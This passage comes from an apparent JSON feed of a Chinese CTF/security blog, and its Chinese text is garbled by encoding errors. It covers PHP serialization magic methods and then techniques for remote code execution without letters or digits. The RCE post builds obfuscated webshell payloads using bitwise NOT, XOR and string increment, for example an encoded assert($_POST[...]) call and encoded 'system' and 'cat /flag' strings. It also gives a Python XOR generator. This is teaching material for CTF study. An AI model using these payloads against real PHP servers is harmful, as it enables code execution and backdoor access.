class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__construct&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__destruct&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__wakeup&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">Â  Â  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">Â  Â  </span>&#123;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__sleep&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">Â  Â  Â  Â  <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;variable&#x27;</span>,<span class=\"string\">&#x27;variable2&#x27;</span>);</span><br><span class=\"line\">Â  Â  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">//åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå›è°ƒç”¨__construct</span></span><br><span class=\"line\"><span class=\"variable\">$object</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">test</span>();</span><br><span class=\"line\"><span class=\"comment\">//åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œä¼šè°ƒç”¨__sleep</span></span><br><span class=\"line\"><span class=\"variable\">$serialized</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$object</span>);</span><br><span class=\"line\"><span class=\"comment\">//è¾“å‡ºåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">&#x27;Serialized:&#x27;</span>.<span class=\"variable\">$serialized</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">//é‡å»ºå¯¹è±¡ï¼Œä¼šè°ƒç”¨__wakeup</span></span><br><span class=\"line\"><span class=\"variable\">$object2</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serialized</span>);</span><br><span class=\"line\"><span class=\"comment\">//è°ƒç”¨printvariable,ä¼šè¾“å‡ºæ•°æ®(å˜é‡ååºåˆ—åŒ–åéƒ½è¦é”€æ¯)</span></span><br><span class=\"line\"><span class=\"variable\">$object2</span>-&gt;<span class=\"title function_ invoke__\">printvariable</span>();</span><br><span class=\"line\"><span class=\"comment\">//è„šæœ¬ç»“æŸï¼Œä¼šè°ƒç”¨__destruct</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ç»“æœ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__construct</span><br><span class=\"line\">__sleep</span><br><span class=\"line\">Serialized:O:4:&quot;test&quot;:2:&#123;s:8:&quot;variable&quot;;s:33:&quot;å˜é‡ååºåˆ—åŒ–åéƒ½è¦é”€æ¯&quot;;s:9:&quot;variable2&quot;;s:5:&quot;OTHER&quot;;&#125;</span><br><span class=\"line\">__wakeup</span><br><span class=\"line\">å˜é‡ååºåˆ—åŒ–åéƒ½è¦é”€æ¯</span><br><span class=\"line\">__destruct</span><br><span class=\"line\">__destruct</span><br></pre></td></tr></table></figure>\n<p>æƒ³å­¦ä¹ æ›´å¤šå…³äº php ååºåˆ—åŒ–æ¼æ´çš„é¢˜ç›®çš„çœ‹è¿™é‡Œå“¦<br>\n<a href=\"https://hq185187.github.io/2023/04/27/unserialize-labs/\">é¶åœºå…¥é—¨</a><br>\n<a href=\"\">è¿›é˜¶åˆ·é¢˜</a></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/",
            "url": "https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/",
            "title": "æ— å­—æ¯æ•°å­—rce",
            "date_published": "2023-04-26T15:44:49.152Z",
            "content_html": "<h2 id=\"ä¸€å–å~\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€å–å~\">#</a> ä¸€ã€‚å–å (~)</h2>\n<ol>\n<li>system () å‡½æ•°</li>\n</ol>\n<ul>\n<li>æ‰§è¡Œå¤–éƒ¨ç¨‹åºå¹¶æ˜¾ç¤ºè¾“å‡ºèµ„æ–™</li>\n</ul>\n<ol start=\"2\">\n<li>eval () å‡½æ•°</li>\n</ol>\n<ul>\n<li>æŠŠå­—ç¬¦ä¸²å½“ php ä»£ç æ‰§è¡Œï¼Œå¿…é¡»ä»¥ï¼›ç»“å°¾</li>\n</ul>\n<ol start=\"3\">\n<li>php çš„å–åé—®é¢˜ï½<br>\n æ­¤é¢˜è¿‡æ»¤äº†å¾ˆå¤šé»‘åå•ï¼Œæ ¹æ®é¢˜ç›®æç¤ºæ˜¯æ— å­—æ¯ rce æƒ³åˆ°äº†ï½</li>\n</ol>\n<ul>\n<li>å¯¹äºæ•°å­—å–åçš„è§„åˆ™å¯ä»¥çœ‹çœ‹è¿™ç¯‡:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>å¯¹äºå­—ç¬¦å–åï¼Œç”±äºæœ‰å¤§é‡çš„ä¸å¯æ˜¾å­—ç¬¦ï¼Œè¦ url ç¼–ç </li>\n<li>æ–¹æ³•ä¸€:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>é…åˆ eval å‡½æ•°å¯ä»¥ç›´æ¥æŠŠ phpinfo (); å½“ php ä»£ç æ‰§è¡Œ<br>\n eg2.<br>\n è¦æ„é€  <code>assert($_POST[1])</code>  è¯­å¥ï¼Œ</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">å¾—åˆ°</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(å†™åœ¨ä¸€è¡Œ):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>å¸¸è§å–å url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n å¯è‡ªè¡Œè¿è¡Œå¾—:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>æ–¹æ³•äºŒ:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;å¢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;å¢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// è¾“å‡ºrr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;æ˜¯\\x8d,\\x8då–åæ˜¯r</code></p>\n<h1 id=\"äºŒå¼‚æˆ–\"><a class=\"markdownIt-Anchor\" href=\"#äºŒå¼‚æˆ–\">#</a> äºŒã€‚å¼‚æˆ–</h1>\n<p>å¼•ä¾‹:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;5&quot;</span>^<span class=\"string\">&quot;Z&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ç»“æœæ˜¯ o, ä¸ºä»€ä¹ˆï¼Ÿ<br>\n5 çš„ ASCII ä¸º 53, äºŒè¿›åˆ¶ä¸º 00110101,Z çš„ ASCII ä¸º 90, äºŒè¿›åˆ¶æ˜¯ 01011010, å°†å®ƒä»¬è¿›è¡Œå¼‚æˆ– (ç›¸åŒä¸º 0, ä¸åŒä¸ºä¸€)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00110101</span><br><span class=\"line\">01011010</span><br><span class=\"line\">01101111=111=o</span><br></pre></td></tr></table></figure>\n<p>æ‰€ä»¥ï¼Œphp ä¸­ä¸¤ä¸ªå­—ç¬¦è¿›è¡Œå¼‚æˆ–æ“ä½œå¾—åˆ°ä»ç„¶æ˜¯ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ˜¯æƒ³è¦ a-z ä¸­ä¸ªå­—ç¬¦æ—¶ï¼Œå°±å¯ä»¥æ‰¾åˆ°ä¸¤ä¸ªéæ•°å­—å­—æ¯çš„å­—ç¬¦ï¼Œåªè¦ä»–ä»¬å¼‚æˆ–çš„ç»“æœæ˜¯è¿™ä¸ªå­—ç¬¦å°±è¡Œ<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMjU0MTA4MC8yMDIxMTAvMjU0MTA4MC0yMDIxMTAxMzIwMTMwOTM1OS0xNDU3NzYwNzkucG5n\"> ASCII ç å‚è€ƒ</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ¯”å¦‚æ„é€ a</span><br><span class=\"line\">01100001 a</span><br><span class=\"line\">00100001 !</span><br><span class=\"line\">01000000 @</span><br><span class=\"line\">æ­¤æ—¶!^@å°±æ˜¯a</span><br></pre></td></tr></table></figure>\n<p>åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æ‹¼æ¥å°±å®Œäº‹äº†</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class=\"line\">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br></pre></td></tr></table></figure>\n<p>ä¹Ÿå¯ä»¥é€šå…³è„šæœ¬æ¥å¿«é€Ÿå¾—åˆ°å¼‚æˆ–éœ€è¦çš„å­—ç¬¦</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">valid = <span class=\"string\">&quot;1234567890!@$%^*()&#123;&#125;[];\\&#x27;\\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class=\"line\">answer = <span class=\"built_in\">str</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;è¯·è¾“å…¥è¿›è¡Œå¼‚æˆ–æ„é€ çš„å­—ç¬¦ä¸²ï¼š&quot;</span>))</span><br><span class=\"line\">tmp1, tmp2 = <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> answer:</span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> valid:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> valid:</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">ord</span>(i) ^ <span class=\"built_in\">ord</span>(j) == <span class=\"built_in\">ord</span>(c)):</span><br><span class=\"line\">        tmp1 += i</span><br><span class=\"line\">        tmp2 += j</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">      <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;tmp1ä¸º:&quot;</span>,tmp1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;tmp2ä¸º:&quot;</span>,tmp2)</span><br></pre></td></tr></table></figure>\n<p>æ‹¼æ¥èµ·æ¥:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$_</span>=(<span class=\"string\">&#x27;%40&#x27;</span>^<span class=\"string\">&#x27;%21&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%1E&#x27;</span>).(<span class=\"string\">&#x27;%7E&#x27;</span>^<span class=\"string\">&#x27;%0C&#x27;</span>).(<span class=\"string\">&#x27;%7C&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>);  <span class=\"comment\">// $_=assert</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"string\">&#x27;_&#x27;</span>.(<span class=\"string\">&#x27;%0D&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0F&#x27;</span>^<span class=\"string\">&#x27;%40&#x27;</span>).(<span class=\"string\">&#x27;%0E&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0B&#x27;</span>^<span class=\"string\">&#x27;%5F&#x27;</span>);  <span class=\"comment\">// $__=_POST</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>=<span class=\"variable\">$$__</span>; <span class=\"comment\">//$___=$_POST</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>(<span class=\"variable\">$___</span>[_]);<span class=\"comment\">//assert($_POST[_]);</span></span><br><span class=\"line\">æ”¾åˆ°ä¸€æ’å°±æ˜¯ï¼š</span><br><span class=\"line\"><span class=\"variable\">$_</span>=(<span class=\"string\">&#x27;%40&#x27;</span>^<span class=\"string\">&#x27;%21&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%1E&#x27;</span>).(<span class=\"string\">&#x27;%7E&#x27;</span>^<span class=\"string\">&#x27;%0C&#x27;</span>).(<span class=\"string\">&#x27;%7C&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>);<span class=\"variable\">$__</span>=<span class=\"string\">&#x27;_&#x27;</span>.(<span class=\"string\">&#x27;%0D&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0F&#x27;</span>^<span class=\"string\">&#x27;%40&#x27;</span>).(<span class=\"string\">&#x27;%0E&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0B&#x27;</span>^<span class=\"string\">&#x27;%5F&#x27;</span>);<span class=\"variable\">$___</span>=<span class=\"variable\">$$__</span>;<span class=\"variable\">$_</span>(<span class=\"variable\">$___</span>[_]);</span><br><span class=\"line\"></span><br><span class=\"line\">postä¼ å‚:</span><br><span class=\"line\">_=<span class=\"title function_ invoke__\">phpinfo</span>();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"ä¸‰è‡ªå¢\"><a class=\"markdownIt-Anchor\" href=\"#ä¸‰è‡ªå¢\">#</a> ä¸‰ã€‚è‡ªå¢</h1>\n<p>åœ¨å¤„ç†å­—ç¬¦è¿ç®—æ—¶ï¼Œphp æ²¿è¢­äº† perl çš„è¯­æ³•è€Œä¸æ˜¯ c çš„ï¼Œè§„åˆ™:<br>\n ä»æœ€åä¸€ä¸ªå­—ç¬¦æŒ‰ç…§ ascii é¡ºåºå‘ä¸Šè¿›ä¸€ä½ï¼Œä¹Ÿå°±æ˜¯ Aâ€“&gt;Z,aâ€“&gt;zï¼Œå¦‚æœæ˜¯ Z æˆ– z å­—ç¬¦ï¼Œå†è¿›ä¸€ä½è¡¨ç¤ºå¤šåŠ ä¸€ä¸ªå­—ç¬¦ã€‚</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=<span class=\"string\">&quot;b&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">c</span><br><span class=\"line\">$a=<span class=\"string\">&quot;ba&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">bb</span><br><span class=\"line\">$a=<span class=\"string\">&quot;bz&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">ca</span><br><span class=\"line\">$a=<span class=\"string\">&quot;Az&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">Ba</span><br><span class=\"line\">$a=<span class=\"string\">&quot;bZ&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">cA</span><br><span class=\"line\">$a=<span class=\"string\">&quot;zz&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">aaa</span><br></pre></td></tr></table></figure>\n<p><mark>æ³¨æ„</mark></p>\n<ol>\n<li>æ³¨æ„å­—ç¬¦å˜é‡åªèƒ½é€’å¢ï¼Œä¸èƒ½é€’å‡ï¼Œå¹¶ä¸”åªæ”¯æŒçº¯å­—æ¯ï¼ˆa-z å’Œ A-Zï¼‰ã€‚</li>\n<li>é€’å¢æˆ–é€’å‡å…¶ä»–å­—ç¬¦å˜é‡åˆ™æ— æ•ˆï¼ŒåŸå­—ç¬¦ä¸²æ²¡æœ‰å˜åŒ–ã€‚<br>\nè¿™é‡Œæ”¾ä¸¤ä¸ª payload:</li>\n</ol>\n<h3 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1.</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=[].<span class=\"string\">&#x27;&#x27;</span>;   <span class=\"comment\">//å¾—åˆ°&quot;Array&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> = <span class=\"variable\">$_</span>[<span class=\"variable\">$__</span>];   <span class=\"comment\">//å¾—åˆ°&quot;A&quot;ï¼Œ$__æ²¡æœ‰å®šä¹‰ï¼Œé»˜è®¤ä¸ºFalseä¹Ÿå³0ï¼Œæ­¤æ—¶$___=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$___</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span> = <span class=\"variable\">$___</span>;   <span class=\"comment\">//$_=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//å¾—åˆ°&quot;S&quot;ï¼Œæ­¤æ—¶$__=&quot;S&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;AS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//å¾—åˆ°&quot;E&quot;ï¼Œæ­¤æ—¶$__=&quot;E&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSE&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//å¾—åˆ°&quot;R&quot;ï¼Œæ­¤æ—¶$__=&quot;R&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSER&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//å¾—åˆ°&quot;T&quot;ï¼Œæ­¤æ—¶$__=&quot;T&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSERT&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> = <span class=\"string\">&quot;_&quot;</span>;   <span class=\"comment\">//$____=&quot;_&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span 